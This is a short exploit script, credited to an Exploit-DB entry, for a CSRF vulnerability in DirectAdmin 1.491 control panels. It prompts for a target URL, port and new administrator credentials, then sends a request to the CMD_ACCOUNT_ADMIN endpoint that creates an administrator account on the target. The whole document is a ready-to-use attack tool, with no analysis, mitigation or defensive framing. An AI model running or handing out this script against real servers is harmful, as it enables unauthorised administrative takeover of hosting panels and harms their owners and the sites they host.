/**
* Title: DirectAdmin 1.491 - CSRF Vulnerability
* Discovered by: Necmettin COSKUN
* Exploit from https://www.exploit-db.com/exploits/39469/
*/

load "http/curl"

print "DirectAdmin 1.491 CSRF Vulnerability Add Admin Account\n"

print "URL Target: "
input.start()
    @url = input.value
input.close()

print "Port Target: "
input.start()
    @port = input.value
input.close()

print "Create admin username: "
input.start()
    @username = input.value
input.close()

print "Create admin email: "
input.start()
    @email = input.value
input.close()

print "Create admin password: "
input.start()
    @password = input.value
    @url = @url.":".@port
    @exploit = "/CMD_ACCOUNT_ADMIN?action=create&username=".@username."&email=".@email."&passwd=".@password."&passwd2=".@password
    @result = curl.get(@url, @exploit)
input.close()